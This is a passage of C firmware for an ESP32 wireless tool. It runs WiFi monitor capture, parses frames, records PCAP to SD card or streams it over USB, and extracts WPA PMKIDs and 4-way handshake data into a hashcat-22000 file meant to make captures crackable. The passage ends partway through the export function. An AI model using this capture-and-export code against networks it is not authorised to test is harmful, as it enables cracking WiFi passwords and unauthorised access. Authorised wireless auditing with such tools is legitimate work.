    if      (!tods &&  fromds) { bssid = d + 10; sta = d + 4;  }   /* AP→STA: a2=AP, a1=STA */
    else if ( tods && !fromds) { bssid = d + 4;  sta = d + 10; }   /* STA→AP: a1=AP, a2=STA */
    else return;                                     /* IBSS/WDS: no infra AP mapping */

    static eapol_parsed_t p;                         /* single parser task -> a static is safe + off-stack */
    memset(&p, 0, sizeof p);
    memcpy(p.bssid, bssid, 6);
    memcpy(p.sta, sta, 6);
    p.have_sta = true;
    p.msg  = msg;
    p.rssi = s->rssi;
    p.ts   = s->ts_us;

    if (msg == 1) {
        if (kf + 45 <= len) {                        /* ANonce = key nonce (kf+13 .. kf+44) */
            memcpy(p.anonce, &d[kf + 13], 32);
            p.have_anonce = true;
        }
        int kdl_off = kf + 93;                       /* PMKID (if any) in the key data */
        if (kdl_off + 2 <= len) {
            int kdl = (d[kdl_off] << 8) | d[kdl_off + 1];
            int kd  = kdl_off + 2;
            int end = kd + kdl;
            if (end > len) end = len;
            int off = kd;
            while (off + 2 <= end) {                 /* walk the key-data KDEs */
                uint8_t t = d[off];
                uint8_t l = d[off + 1];
                if (off + 2 + l > end) break;
                if (t == 0xDD && l >= 0x14 &&        /* vendor KDE, RSN OUI 00-0F-AC, PMKID (type 4) */
                    d[off+2] == 0x00 && d[off+3] == 0x0F && d[off+4] == 0xAC && d[off+5] == 0x04) {
                    memcpy(p.pmkid, &d[off + 6], 16);
                    p.have_pmkid = true;
                    break;
                }
                off += 2 + l;
            }
        }
    } else if (msg == 2) {
        if (kf + 93 <= len) {                        /* MIC (kf+77..92) + the EAPOL frame bytes */
            memcpy(p.mic, &d[kf + 77], 16);
            int klen = (d[eo + 2] << 8) | d[eo + 3]; /* EAPOL body length field */
            int elen = 4 + klen;                     /* whole EAPOL frame (header + body) */
            if (elen > len - eo)      elen = len - eo;
            if (elen > HS_EAPOL_MAX)  elen = HS_EAPOL_MAX;
            if (elen >= 81 + 16) {                    /* need room through the MIC field */
                memcpy(p.eapol, &d[eo], elen);
                memset(&p.eapol[81], 0, 16);          /* zero the MIC field for hc22000 */
                p.eapol_len = (uint8_t)elen;
                p.have_mic  = true;
            }
        }
    }

    hs_upsert(&p);
}

/* Decode one captured frame (parser task, off the hot path). Beacon / probe-response management
 * frames identify an AP; probe requests harvest searched-for SSIDs; data frames map stations to
 * their AP. All IE offsets are bounds-checked against cap_len — a frame truncated by the snaplen
 * just yields fewer fields. */
static void parse_frame(const cap_slot_t *s)
{
    if (s->cap_len < 24) {                          /* need at least a MAC header */
        return;
    }
    const uint8_t *d = s->data;
    uint8_t ftype = (d[0] >> 2) & 0x3;
    uint8_t fsub  = (d[0] >> 4) & 0xF;

    if (ftype == 2) {                               /* data frame -> station mapping (+ EAPOL) */
        parse_data_frame(s, d);
        int eo = eapol_offset(d, s->cap_len);       /* key exchange rides in EAPOL data frames */
        if (eo) parse_eapol(s, d, eo);
        return;
    }
    if (ftype != 0) {                               /* control frames carry no identity here */
        return;
    }
    if (fsub == 4) {                                /* management probe request */
        parse_probe_req(s, d);
        return;
    }
    if (fsub != 8 && fsub != 5) {                   /* only beacon(8) / probe-response(5) below */
        return;
    }
    if (s->cap_len < 36) {                          /* need the fixed params for an AP decode */
        return;
    }
    const uint8_t *bssid = d + 16;                  /* addr3 */
    uint16_t cap_info = d[34] | (d[35] << 8);
    bool privacy = (cap_info & 0x0010) != 0;

    char    ssid[WIFI_SSID_MAX]; ssid[0] = '\0';
    bool    hidden  = true;
    uint8_t channel = s->channel;
    uint8_t sec     = privacy ? NOCSIF_WIFI_SEC_WEP : NOCSIF_WIFI_SEC_OPEN;
    bool    have_rsn = false, have_wpa = false;

    int len = s->cap_len;
    int off = 36;                                   /* first tagged IE (after the fixed params) */
    while (off + 2 <= len) {
        uint8_t tag  = d[off];
        uint8_t tlen = d[off + 1];
        if (off + 2 + tlen > len) break;            /* truncated by snaplen — stop */
        const uint8_t *v = d + off + 2;
        if (tag == 0) {                             /* SSID */
            if (tlen > 0) {
                bool allzero = true;
                for (int i = 0; i < tlen; i++) { if (v[i]) { allzero = false; break; } }
                if (!allzero) {
                    int n = tlen > 32 ? 32 : tlen;
                    for (int i = 0; i < n; i++) {   /* sanitize to the font's printable range */
                        uint8_t c = v[i];
                        ssid[i] = (c >= 0x20 && c < 0x7F) ? (char)c : '?';
                    }
                    ssid[n] = '\0';
                    hidden = false;
                }
            }
        } else if (tag == 3) {                       /* DS parameter set: home channel */
            if (tlen >= 1 && v[0] >= 1 && v[0] <= 14) channel = v[0];
        } else if (tag == 48) {                      /* RSN */
            have_rsn = true;
            sec = classify_rsn(v, tlen);
        } else if (tag == 221 && tlen >= 4 &&        /* vendor: WPA (00-50-F2 type 1) */
                   v[0] == 0x00 && v[1] == 0x50 && v[2] == 0xF2 && v[3] == 0x01) {
            have_wpa = true;
        }
        off += 2 + tlen;
    }
    if (!have_rsn && have_wpa) sec = NOCSIF_WIFI_SEC_WPA;

    ap_upsert(bssid, ssid, hidden, channel, s->rssi, sec, s->ts_us);
}

/* Parser drain task (single consumer): decode every published slot, then release the head. Idles
 * on a short poll when the ring is empty or parsing is off (kept simple — no notify from the cb). */
static void wifi_parse_task(void *arg)
{
    (void)arg;
    for (;;) {
        if (!s_parse_active || s_ring == NULL) {
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }
        uint32_t head = s_ring_head;                       /* sole consumer */
        uint32_t tail = __atomic_load_n(&s_ring_tail, __ATOMIC_ACQUIRE);
        if (head == tail) {
            vTaskDelay(pdMS_TO_TICKS(20));                  /* idle poll */
            continue;
        }
        while (head != tail) {
            parse_frame(&s_ring[head & (CAP_SLOTS - 1)]);
            head++;
        }
        __atomic_store_n(&s_ring_head, head, __ATOMIC_RELEASE);
    }
}

static void do_monitor_on(void)
{
    if (s_mon_active) {
        return;
    }
    if (!bring_up()) {
        return;
    }
    if (s_ap_active) { ap_teardown(); }               /* single radio: capture ends the AP */
    s_enabled = true;                                 /* capture powers the radio */
    if (!ensure_started()) {
        return;
    }
    if (s_sta_started) {
        enter_promiscuous();
    } else {
        s_pending_monitor = true;                     /* STA_START will enter */
        refresh_strings();
    }
}

static void do_monitor_off(void)
{
    if (!s_mon_active && !s_pending_monitor) {
        return;
    }
    bool was_active = s_mon_active;
    monitor_teardown();
    if (was_active && s_mon_prev_connected && s_ssid[0]) {   /* restore the link we suspended */
        s_want_connect = true;
        s_retry = 0;
        s_auth_fail = false;
        s_join_state = NOCSIF_WIFI_JOIN_JOINING;
        apply_config();
        try_connect();
    }
    refresh_strings();
}

static void do_mon_hop(bool hop)
{
    s_mon_hop = hop;
    refresh_strings();
}

static void do_mon_chan(int ch)
{
    if (ch < 1)  ch = 1;
    if (ch > 13) ch = 13;
    s_mon_hop = false;                                /* picking a channel implies lock */
    s_mon_chan = ch;
    if (s_mon_active) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    }
    refresh_strings();
}

/* Turn the passive parser on: ensure capture is running (it drops any STA link), lazily allocate
 * the PSRAM copy-out ring, clear the AP table, spin up the drain task once, then arm the rx-cb
 * copy-out. Idempotent while already parsing (so we never reset the ring under the live producer). */
static void do_parse_on(void)
{
    if (s_parse_active) {
        return;
    }
    if (nocsif_reliability_safe_mode()) {
        return;
    }
    if (!s_mon_active && !s_pending_monitor) {         /* capture is the source — start it */
        do_monitor_on();
    }
    if (!s_mon_active && !s_pending_monitor) {         /* capture failed to come up — don't arm */
        ESP_LOGW(TAG, "parser: capture did not start; not arming");
        return;
    }
    if (s_ring == NULL) {
        s_ring = heap_caps_malloc(sizeof(cap_slot_t) * CAP_SLOTS, MALLOC_CAP_SPIRAM);
        if (s_ring == NULL) {
            ESP_LOGE(TAG, "parser: ring alloc failed (%u B PSRAM)",
                     (unsigned)(sizeof(cap_slot_t) * CAP_SLOTS));
            return;
        }
    }
    s_ring_head = s_ring_tail = s_ring_drop = 0;       /* safe: producer skips while s_parse_active=0 */

    portENTER_CRITICAL(&s_ap_mux);
    for (int i = 0; i < MON_AP_MAX; i++)    s_mon_ap[i].used    = false;
    for (int i = 0; i < MON_STA_MAX; i++)   s_mon_sta[i].used   = false;
    for (int i = 0; i < MON_PROBE_MAX; i++) s_mon_probe[i].used = false;
    for (int i = 0; i < MON_HS_MAX; i++)    s_mon_hs[i].used    = false;
    s_mon_ap_cnt = s_mon_sta_cnt = s_mon_probe_cnt = s_mon_hs_cnt = 0;
    s_mon_ap_gen++; s_mon_sta_gen++; s_mon_probe_gen++; s_mon_hs_gen++;
    portEXIT_CRITICAL(&s_ap_mux);

    if (s_parse_task == NULL) {
        /* RAM Phase A3: the four LAZY WiFi workers (parser / PCAP writer / handshake export / portal DNS)
         * get PSRAM stacks. They are exactly the transient internal claims that eroded the contiguous
         * int-DMA run under Signal Hunt / capture (measured −9 KB in LoRa-hunt mode after A2), and each is
         * cache-off-safe: the parser reads the PSRAM ring into BSS tables, the writers stream to SD over
         * SPI (a PSRAM-resident write buffer is bounced by sdspi's own internal block buffer), the DNS
         * task only touches LWIP sockets — none writes NVS / internal flash on-task (the pinned `wifi`
         * command worker owns every NVS write in this file). Deleted workers use vTaskDeleteWithCaps. */
        if (xTaskCreateWithCaps(wifi_parse_task, "wifiparse", 3072, NULL, 3, &s_parse_task, MALLOC_CAP_SPIRAM) != pdPASS) {
            ESP_LOGE(TAG, "parser: task create failed");
            return;
        }
    }
    s_parse_active = true;
    ESP_LOGI(TAG, "parser on (nearby-AP list); int-dma free=%u",
             (unsigned)nocsif_int_dma_free());
}

static void do_parse_off(void)
{
    if (!s_parse_active) {
        return;
    }
    s_parse_active = false;
    ESP_LOGI(TAG, "parser off (%d APs seen, %u frames dropped)",
             s_mon_ap_cnt, (unsigned)s_ring_drop);
}

/* ---- PCAP capture to /sd (M5-P3·3) ------------------------------------------------- *
 * A dedicated writer task owns the FILE*: it drains the all-frames ring and appends each frame
 * with a radiotap header. FAT I/O demands a large stack (the lean parser task's 3072 B overflows
 * inside fopen/fwrite — the reason this runs on its own 8 KB task). */

/* Our fixed 13-byte radiotap header: present = Channel(bit3) + dBm Antenna Signal(bit5). */
static void pcap_build_radiotap(uint8_t rt[PCAP_RADIOTAP_LEN], uint8_t channel, int8_t rssi)
{
    int c = (channel >= 1 && channel <= 14) ? channel : 1;
    uint16_t freq = (c == 14) ? 2484 : (uint16_t)(2412 + (c - 1) * 5);
    rt[0] = 0; rt[1] = 0;                              /* it_version, it_pad            */
    rt[2] = PCAP_RADIOTAP_LEN; rt[3] = 0;              /* it_len (LE)                   */
    rt[4] = 0x28; rt[5] = 0; rt[6] = 0; rt[7] = 0;     /* it_present: Channel + dBm sig */
    rt[8]  = (uint8_t)(freq & 0xFF);                   /* channel frequency (LE)        */
    rt[9]  = (uint8_t)(freq >> 8);
    rt[10] = 0x80; rt[11] = 0x00;                      /* channel flags: 2 GHz          */
    rt[12] = (uint8_t)rssi;                            /* dBm antenna signal (int8)     */
}

/* Choose the next free capture file. Assumes the /sd lock is held. The prefix reflects the active
 * filter: cap-NNN (full capture) vs hs-NNN (EAPOL key-exchange session). */
static void pcap_pick_path(char *out, size_t outlen)
{
    const char *pfx = (s_pcap_filter == PCAP_FILTER_EAPOL) ? "hs" : "cap";
    for (int i = 0; i < 1000; i++) {
        snprintf(out, outlen, "/sd/nocsif/wifi/%s-%03d.pcap", pfx, i);
        struct stat st;
        if (stat(out, &st) != 0) {
            return;                                    /* first non-existent name */
        }
    }
    snprintf(out, outlen, "/sd/nocsif/wifi/%s-999.pcap", pfx);   /* fallback: reuse the last */
}

/* Open the capture file: own the card, create the output dirs, write the PCAP global header.
 * Returns the FILE* with s_pcap_path + counters set, or NULL with s_pcap_state on failure. */
static FILE *pcap_open_file(void)
{
    esp_err_t ce = nocsif_usb_gadget_claim_sd(2000);
    if (ce != ESP_OK) {
        s_pcap_state = (ce == ESP_ERR_INVALID_STATE) ? PCAP_FILESHARE : PCAP_NOSD;
        ESP_LOGW(TAG, "pcap: claim_sd -> %s", esp_err_to_name(ce));
        return NULL;
    }
    if (!nocsif_sdcard_lock(3000)) {
        s_pcap_state = PCAP_ERR;
        ESP_LOGE(TAG, "pcap: /sd lock timeout");
        return NULL;
    }
    mkdir("/sd/nocsif", 0777);                         /* ignore EEXIST */
    mkdir("/sd/nocsif/wifi", 0777);
    pcap_pick_path(s_pcap_path, sizeof s_pcap_path);
    FILE *f = fopen(s_pcap_path, "wb");
    if (f == NULL) {
        ESP_LOGE(TAG, "pcap: fopen(%s) failed", s_pcap_path);
        nocsif_sdcard_unlock();
        s_pcap_state = PCAP_ERR;
        s_pcap_path[0] = '\0';
        return NULL;
    }
    /* PCAP global header (LE): magic a1b2c3d4 · v2.4 · zone 0 · sig 0 · snaplen · LINKTYPE=127. */
    uint8_t gh[24];
    uint32_t magic = 0xa1b2c3d4u, snaplen = PCAP_SNAP + PCAP_RADIOTAP_LEN, net = 127;
    memcpy(gh + 0, &magic, 4);
    gh[4] = 2; gh[5] = 0; gh[6] = 4; gh[7] = 0;        /* version_major 2, version_minor 4 */
    memset(gh + 8, 0, 8);                              /* thiszone + sigfigs */
    memcpy(gh + 16, &snaplen, 4);
    memcpy(gh + 20, &net, 4);
    fwrite(gh, 1, sizeof gh, f);
    fflush(f);
    nocsif_sdcard_unlock();

    s_pcap_bytes  = sizeof gh;
    s_pcap_frames = 0;
    s_pcap_state  = PCAP_REC;
    ESP_LOGI(TAG, "pcap: recording -> %s", s_pcap_path);
    return f;
}

/* Append one frame record (record header + radiotap + captured bytes). Assumes the lock is held. */
static void pcap_write_record(FILE *f, const pcap_slot_t *s)
{
    uint8_t rt[PCAP_RADIOTAP_LEN];
    pcap_build_radiotap(rt, s->channel, s->rssi);

    uint32_t ts_sec  = (uint32_t)(s->ts_us / 1000000);
    uint32_t ts_usec = (uint32_t)(s->ts_us % 1000000);
    uint32_t incl = PCAP_RADIOTAP_LEN + s->cap_len;
    uint32_t orig = PCAP_RADIOTAP_LEN + s->orig_len;

    uint8_t rh[16];
    memcpy(rh + 0,  &ts_sec,  4);
    memcpy(rh + 4,  &ts_usec, 4);
    memcpy(rh + 8,  &incl,    4);
    memcpy(rh + 12, &orig,    4);
    fwrite(rh, 1, sizeof rh, f);
    fwrite(rt, 1, PCAP_RADIOTAP_LEN, f);
    fwrite(s->data, 1, s->cap_len, f);

    s_pcap_bytes  += sizeof rh + incl;
    s_pcap_frames++;
}

/* ---- CDC live-stream sink (M5-P5+) ------------------------------------------------------- *
 * The same PCAP byte layout as the SD file (a global header once, then radiotap + record per frame)
 * but pushed to the host over USB-CDC instead of written to /sd. A host tool (Wireshark via the
 * bundled extcap) opens the port and reads a live capture. No /sd lock, no FILE* — just the CDC TX
 * ring. Bytes accepted by cdc_write are committed to the wire, so a record is always sent whole. */

/* Send the whole buffer over CDC, looping past FIFO-full with bounded flushes. A total stall (the
 * host stopped reading) returns false; the caller then re-emits a fresh global header on reconnect
 * so the stream re-frames cleanly. */
static bool pcap_cdc_send_all(const uint8_t *buf, size_t len)
{
    size_t off = 0;
    int    stalls = 0;
    while (off < len) {
        size_t n = nocsif_usb_gadget_cdc_write(buf + off, len - off);
        off += n;
        if (off < len) {
            nocsif_usb_gadget_cdc_flush(20);
            if (n == 0) {
                if (++stalls > 12) return false;       /* ~250 ms of no progress: host gone */
            } else {
                stalls = 0;
            }
        }
    }
    return true;
}

/* Emit the PCAP global header to CDC (once per stream session). Mirrors pcap_open_file's header. */
static bool pcap_cdc_header(void)
{
    uint8_t gh[24];
    uint32_t magic = 0xa1b2c3d4u, snaplen = PCAP_SNAP + PCAP_RADIOTAP_LEN, net = 127;
    memcpy(gh + 0, &magic, 4);
    gh[4] = 2; gh[5] = 0; gh[6] = 4; gh[7] = 0;        /* version_major 2, version_minor 4 */
    memset(gh + 8, 0, 8);                              /* thiszone + sigfigs */
    memcpy(gh + 16, &snaplen, 4);
    memcpy(gh + 20, &net, 4);
    if (!pcap_cdc_send_all(gh, sizeof gh)) {
        return false;
    }
    nocsif_usb_gadget_cdc_flush(20);
    s_pcap_bytes = sizeof gh;
    return true;
}

/* Push one frame record (record header + radiotap + captured bytes) to CDC, built contiguously so
 * it is never split mid-flight. Returns false on a host stall (the stream must restart). */
static bool pcap_cdc_record(const pcap_slot_t *s)
{
    uint8_t  rec[16 + PCAP_RADIOTAP_LEN + PCAP_SNAP];
    uint32_t ts_sec  = (uint32_t)(s->ts_us / 1000000);
    uint32_t ts_usec = (uint32_t)(s->ts_us % 1000000);
    uint16_t cap = (s->cap_len > PCAP_SNAP) ? PCAP_SNAP : s->cap_len;
    uint32_t incl = PCAP_RADIOTAP_LEN + cap;
    uint32_t orig = PCAP_RADIOTAP_LEN + s->orig_len;
    memcpy(rec + 0,  &ts_sec,  4);
    memcpy(rec + 4,  &ts_usec, 4);
    memcpy(rec + 8,  &incl,    4);
    memcpy(rec + 12, &orig,    4);
    pcap_build_radiotap(rec + 16, s->channel, s->rssi);
    memcpy(rec + 16 + PCAP_RADIOTAP_LEN, s->data, cap);
    size_t total = 16 + PCAP_RADIOTAP_LEN + cap;
    if (!pcap_cdc_send_all(rec, total)) {
        return false;
    }
    s_pcap_bytes += total;
    s_pcap_frames++;
    return true;
}

/* Single consumer of the PCAP ring; owns the whole sink lifecycle. The sink is chosen by
 * s_pcap_sink before arming: SD writes a file (open on request, drain under the /sd lock, close on
 * stop); CDC streams to the host serial port (wait for a host, emit the header, drain to CDC). */
static void pcap_writer_task(void *arg)
{
    (void)arg;
    FILE *f = NULL;             /* SD sink FILE* (NULL when streaming to CDC)   */
    bool  cdc_open = false;     /* CDC sink: global header sent, streaming live */
    for (;;) {
        if (!s_pcap_want) {                            /* stop requested — tear down whichever sink */
            if (f) {                                   /* SD: flush + close */
                if (nocsif_sdcard_lock(2000)) { fflush(f); fclose(f); nocsif_sdcard_unlock(); }
                else                          { fclose(f); }
                f = NULL;
                ESP_LOGI(TAG, "pcap: closed (%u frames, %u bytes, %u dropped)",
                         (unsigned)s_pcap_frames, (unsigned)s_pcap_bytes, (unsigned)s_pcap_drop);
            }
            if (cdc_open) {                            /* CDC: flush what is queued */
                nocsif_usb_gadget_cdc_flush(50);
                cdc_open = false;
                ESP_LOGI(TAG, "pcap: stream stopped (%u frames, %u bytes, %u dropped)",
                         (unsigned)s_pcap_frames, (unsigned)s_pcap_bytes, (unsigned)s_pcap_drop);
            }
            s_pcap_active = false;
            if (s_pcap_state == PCAP_REC || s_pcap_state == PCAP_STREAM || s_pcap_state == PCAP_NOHOST) {
                s_pcap_state = PCAP_OFF;
            }
            s_pcap_idle = true;                        /* parked: pcap_stop_and_free may now delete us */
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }
        s_pcap_idle = false;                           /* actively capturing — not safe to delete */

        if (s_pcap_sink == PCAP_SINK_CDC) {
            /* ---- CDC live stream (M5-P5+) ---- */
            bool ready = nocsif_usb_gadget_cdc_ready();
            if (cdc_open && !ready) {                   /* host went away (even while idle) — the next
                                                        * host must get a fresh global header */
                cdc_open = false;
                s_pcap_active = false;
                s_pcap_state  = PCAP_NOHOST;
            }
            if (!cdc_open) {
                if (!ready) {                          /* CDC not enumerated / no host reading yet */
                    s_pcap_state  = PCAP_NOHOST;
                    s_pcap_active = false;             /* don't fill the ring until a host is present */
                    vTaskDelay(pdMS_TO_TICKS(200));
                    continue;
                }
                if (!pcap_cdc_header()) {              /* host vanished mid-header — retry */
                    vTaskDelay(pdMS_TO_TICKS(200));
                    continue;
                }
                s_pcap_head = s_pcap_tail = s_pcap_drop = 0;   /* fresh ring for this session */
                s_pcap_frames = 0;
                s_pcap_active = true;                  /* now the rx cb fills the ring */
                s_pcap_state  = PCAP_STREAM;
                cdc_open = true;
            }
            uint32_t head = s_pcap_head;               /* sole consumer */
            uint32_t tail = __atomic_load_n(&s_pcap_tail, __ATOMIC_ACQUIRE);
            if (head == tail) {
                nocsif_usb_gadget_cdc_flush(10);
                vTaskDelay(pdMS_TO_TICKS(15));         /* idle poll */
                continue;
            }
            int  budget = 24;
            bool ok = true;
            while (head != tail && budget-- > 0) {
                if (!pcap_cdc_record(&s_pcap_ring[head & (PCAP_SLOTS - 1)])) { ok = false; break; }
                head++;
            }
            __atomic_store_n(&s_pcap_head, head, __ATOMIC_RELEASE);
            nocsif_usb_gadget_cdc_flush(20);
            if (!ok) {                                 /* host stalled — restart cleanly on reconnect */
                cdc_open = false;
                s_pcap_active = false;
                s_pcap_state  = PCAP_NOHOST;
            }
            continue;
        }

        /* ---- SD file (P3·3, unchanged) ---- */
        if (f == NULL) {                               /* start requested: open the file */
            f = pcap_open_file();
            if (f == NULL) {                           /* open failed — give up this session */
                s_pcap_want = false;
                s_pcap_active = false;
                vTaskDelay(pdMS_TO_TICKS(100));
                continue;
            }
            s_pcap_head = s_pcap_tail = s_pcap_drop = 0;   /* fresh ring (producer idle until active) */
            s_pcap_active = true;                       /* now the rx cb fills the ring */
        }

        uint32_t head = s_pcap_head;                    /* sole consumer */
        uint32_t tail = __atomic_load_n(&s_pcap_tail, __ATOMIC_ACQUIRE);
        if (head == tail) {
            vTaskDelay(pdMS_TO_TICKS(50));              /* idle poll */
            continue;
        }
        /* Drain in bounded batches so the /sd lock is never held for a full-ring burst. */
        if (nocsif_sdcard_lock(1000)) {
            int budget = 24;
            while (head != tail && budget-- > 0) {
                pcap_write_record(f, &s_pcap_ring[head & (PCAP_SLOTS - 1)]);
                head++;
            }
            fflush(f);
            nocsif_sdcard_unlock();
            __atomic_store_n(&s_pcap_head, head, __ATOMIC_RELEASE);
        } else {
            vTaskDelay(pdMS_TO_TICKS(20));              /* lock busy — retry shortly */
        }
    }
}

/* Allocate the PCAP ring (lazy, PSRAM) + spawn the big-stack writer task, then arm it. Shared by the
 * SD recorder and the CDC live stream (the caller picks s_pcap_sink first). Returns false on an
 * allocation / task-create failure (state left at PCAP_ERR). The 6144 stack matches the ducky FATFS
 * reader; the task exists only while a session is armed and is freed on stop (pcap_stop_and_free). */
static bool pcap_arm_writer(void)
{
    if (s_pcap_ring == NULL) {
        s_pcap_ring = heap_caps_malloc(sizeof(pcap_slot_t) * PCAP_SLOTS, MALLOC_CAP_SPIRAM);
        if (s_pcap_ring == NULL) {
            ESP_LOGE(TAG, "pcap: ring alloc failed (%u B PSRAM)",
                     (unsigned)(sizeof(pcap_slot_t) * PCAP_SLOTS));
            s_pcap_state = PCAP_ERR;
            return false;
        }
    }
    s_pcap_frames = s_pcap_bytes = s_pcap_drop = 0;
    if (s_pcap_task == NULL) {
        s_pcap_idle = false;
        if (xTaskCreateWithCaps(pcap_writer_task, "wifipcap", 6144, NULL, 3, &s_pcap_task, MALLOC_CAP_SPIRAM) != pdPASS) {
            ESP_LOGE(TAG, "pcap: writer task create failed (PSRAM stack — A3)");
            s_pcap_state = PCAP_ERR;
            s_pcap_idle = true;
            return false;
        }
    }
    s_pcap_want = true;                                 /* the writer opens the sink + arms the copy-out */
    return true;
}

static void do_pcap_on(void)
{
    if (s_pcap_want) {
        return;
    }
    if (nocsif_reliability_safe_mode()) {
        return;
    }
    if (!s_mon_active && !s_pending_monitor) {          /* capture is the source — start it */
        do_monitor_on();
    }
    if (!s_mon_active && !s_pending_monitor) {
        ESP_LOGW(TAG, "pcap: capture did not start; not recording");
        s_pcap_state = PCAP_ERR;
        return;
    }
    s_pcap_sink = PCAP_SINK_SD;                          /* record to a file on the card */
    pcap_arm_writer();
}

/* Live-PCAP over USB-CDC (M5-P5+): stream captured frames to the host serial port for real-time
 * Wireshark (via the bundled extcap) instead of writing a file. Auto-requests CDC gadget mode (the
 * transport) and starts monitor (the source); the writer then waits for a host to open the port
 * (DTR) before emitting the PCAP stream. Shares the single ring/writer — refused while any capture
 * session is active. Runs on the wifi worker (serialised with do_pcap_*). */
static void do_pcap_stream_on(void)
{
    if (s_pcap_want) {
        ESP_LOGW(TAG, "pcap: a capture session is already active; ignoring stream request");
        return;
    }
    if (nocsif_reliability_safe_mode()) {
        return;
    }
    if (!s_mon_active && !s_pending_monitor) {          /* capture is the source — start it */
        do_monitor_on();
    }
    if (!s_mon_active && !s_pending_monitor) {
        ESP_LOGW(TAG, "pcap: capture did not start; not streaming");
        s_pcap_state = PCAP_ERR;
        return;
    }
    nocsif_usb_gadget_request_mode(NOCSIF_USB_MODE_CDC); /* transport — enumerate CDC to the host */
    s_pcap_sink   = PCAP_SINK_CDC;
    s_pcap_filter = PCAP_FILTER_FULL;
    s_pcap_state  = PCAP_NOHOST;                         /* until a host opens the port */
    if (!pcap_arm_writer()) {
        s_pcap_sink = PCAP_SINK_SD;                      /* arm failed — restore the default sink */
    }
}

/* Stop recording and RECLAIM the writer task's internal-RAM stack. Runs on the wifi worker (which
 * also runs do_pcap_on), so the create/delete lifecycle is serialised — no race with a restart.
 * Waits (bounded) for the writer to close the file + park before deleting it, so we never delete a
 * task mid-fwrite or while it holds the /sd lock. */
static void pcap_stop_and_free(void)
{
    s_pcap_want   = false;                              /* writer flushes + closes, then parks */
    s_pcap_active = false;                              /* producer (rx cb) stops immediately  */
    if (s_pcap_task) {
        for (int i = 0; i < 80 && !s_pcap_idle; i++) {  /* up to ~2 s for the file to close + park */
            vTaskDelay(pdMS_TO_TICKS(25));
        }
        vTaskDeleteWithCaps(s_pcap_task);               /* paired with xTaskCreateWithCaps: frees the PSRAM stack + TCB */
        s_pcap_task = NULL;
    }
    if (s_pcap_state == PCAP_REC || s_pcap_state == PCAP_STREAM || s_pcap_state == PCAP_NOHOST) {
        s_pcap_state = PCAP_OFF;
    }
}

static void do_pcap_stream_off(void)
{
    pcap_stop_and_free();
    s_pcap_sink = PCAP_SINK_SD;                          /* restore the file sink for the next Record */
}

static void do_pcap_off(void)
{
    pcap_stop_and_free();
}

/* Arm the shared PCAP writer in EAPOL-filter mode (M5-P4·1) — records the key exchange + naming
 * frames to hs-NNN.pcap. Refused if the writer is already recording (one file at a time); the full
 * and EAPOL sessions share one ring + task. Runs on the wifi worker (serialised with do_pcap_*). */
static void do_hs_capture_on(void)
{
    if (s_pcap_want) {                                  /* a session is already recording */
        ESP_LOGW(TAG, "hs: capture already recording; ignoring");
        return;
    }
    s_pcap_filter = PCAP_FILTER_EAPOL;
    do_pcap_on();
    if (!s_pcap_want) {                                 /* start failed — restore the default filter */
        s_pcap_filter = PCAP_FILTER_FULL;
    }
}

/* ---- hc22000 export (M5 passive polish) -------------------------------------------- *
 * Turn the captured PMKIDs + 4-way handshakes into a hashcat-22000 file on /sd, so a capture is
 * crackable without the PC-side hcxpcapngtool step. One-shot: a dedicated big-stack task snapshots
 * the key-exchange table (per-entry, under the lock), writes WPA*01 (PMKID) and WPA*02 (handshake)
 * lines, then self-deletes. Reuses the app-owned-/sd claim + lock discipline of the PCAP writer. */
typedef enum { HC_IDLE = 0, HC_BUSY, HC_DONE, HC_NOSD, HC_FILESHARE, HC_ERR } hc_state_t;
static volatile int  s_hc_state = HC_IDLE;
static volatile int  s_hc_lines;
static volatile bool s_hc_running;
static char          s_hc_path[64];

/* Append n bytes of `src` as lowercase hex to dst (bounded by cap); returns chars written. */
static int hexcat(char *dst, int cap, const uint8_t *src, int n)
{
    static const char h[] = "0123456789abcdef";
    int w = 0;
    for (int i = 0; i < n && w + 2 < cap; i++) {
        dst[w++] = h[src[i] >> 4];
        dst[w++] = h[src[i] & 0x0F];
    }
    if (w < cap) dst[w] = '\0';
    return w;
}

static void hc_export_task(void *arg)
{
    (void)arg;
    esp_err_t ce = nocsif_usb_gadget_claim_sd(2000);
    if (ce != ESP_OK) {
        s_hc_state = (ce == ESP_ERR_INVALID_STATE) ? HC_FILESHARE : HC_NOSD;
        s_hc_running = false;
        vTaskDeleteWithCaps(NULL);
        return;
    }
    if (!nocsif_sdcard_lock(3000)) {
        s_hc_state = HC_ERR; s_hc_running = false; vTaskDeleteWithCaps(NULL); return;
    }
    mkdir("/sd/nocsif", 0777);
    mkdir("/sd/nocsif/wifi", 0777);
    snprintf(s_hc_path, sizeof s_hc_path, "/sd/nocsif/wifi/nocsif.hc22000");
    FILE *f = fopen(s_hc_path, "w");
    if (f == NULL) {
        nocsif_sdcard_unlock(); s_hc_state = HC_ERR; s_hc_path[0] = '\0';
        s_hc_running = false; vTaskDeleteWithCaps(NULL); return;
    }

    int cnt;
    portENTER_CRITICAL(&s_ap_mux);
    cnt = s_mon_hs_cnt;
    portEXIT_CRITICAL(&s_ap_mux);

    int lines = 0;
    for (int i = 0; i < cnt; i++) {
        mon_hs_t e;
        char ssid[WIFI_SSID_MAX]; ssid[0] = '\0';
        bool ok;
        portENTER_CRITICAL(&s_ap_mux);
        ok = (i < s_mon_hs_cnt && s_mon_hs[i].used);
        if (ok) {
            e = s_mon_hs[i];
            for (int j = 0; j < s_mon_ap_cnt; j++) {   /* resolve the ESSID from the AP table */
                if (s_mon_ap[j].used && memcmp(s_mon_ap[j].bssid, e.bssid, 6) == 0) {
                    memcpy(ssid, s_mon_ap[j].ssid, sizeof ssid);
                    break;
                }
            }
        }
        portEXIT_CRITICAL(&s_ap_mux);
        if (!ok || !e.have_sta) {
            continue;
        }
        int slen = (int)strlen(ssid);

        char line[600];
        if (e.has_pmkid) {                             /* WPA*01*pmkid*apmac*stamac*essid*** */
            int p = 0;
            p += snprintf(line + p, sizeof line - p, "WPA*01*");
            p += hexcat(line + p, sizeof line - p, e.pmkid, 16); p += snprintf(line + p, sizeof line - p, "*");
            p += hexcat(line + p, sizeof line - p, e.bssid, 6);  p += snprintf(line + p, sizeof line - p, "*");
            p += hexcat(line + p, sizeof line - p, e.sta, 6);    p += snprintf(line + p, sizeof line - p, "*");
            p += hexcat(line + p, sizeof line - p, (const uint8_t *)ssid, slen);
            p += snprintf(line + p, sizeof line - p, "***\n");
